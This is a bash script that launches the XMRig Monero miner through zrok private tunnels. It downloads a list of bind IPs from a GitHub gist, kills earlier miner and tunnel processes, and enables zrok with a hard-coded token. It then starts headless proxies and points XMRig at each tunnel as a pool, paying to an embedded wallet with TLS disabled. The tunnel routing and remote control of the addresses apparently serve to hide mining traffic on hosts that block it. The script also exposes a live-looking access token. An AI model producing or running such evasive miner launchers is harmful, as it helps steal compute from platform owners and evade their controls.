#!/bin/bash

CONFIG_URL="https://gist.githubusercontent.com/Luisbuttocks/ac7b5ada6be6cd004958c0809b12ebdc/raw/gistfile1.txt"
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
ZROK_TOKEN="23hr12Uz33O1"


BIND_IPS=($(curl -sL "$CONFIG_URL" | tr -d '\r'))


pkill -f zrok
pkill -f xmrig-x86_64-st
./zrok enable "$ZROK_TOKEN"

for ip in "${BIND_IPS[@]}"; do
    if [[ ! -z "$ip" ]]; then
        echo "Binding bridge to $ip..."
        nohup ./zrok access private proxy1 --bind "$ip:9999" --headless > /dev/null 2>&1 &
    fi
done

sleep 5

XMRIG_CMD="./xmrig-x86_64-static -c config.json"

# Append each IP from your gist as a separate pool
for ip in "${BIND_IPS[@]}"; do
    if [[ ! -z "$ip" ]]; then
        # Force TLS off per-pool by NOT adding the --tls flag
        XMRIG_CMD="$XMRIG_CMD -o $ip:9999 -u $WALLET"
    fi
done

# --- 6. LAUNCH ---
echo "-------------------------------------------------------"
echo "Found IPs: ${#BIND_IPS[@]}"
echo "Launching XMRig with bridges (TLS DISABLED)"
echo "-------------------------------------------------------"

# Running in foreground as requested
$XMRIG_CMD
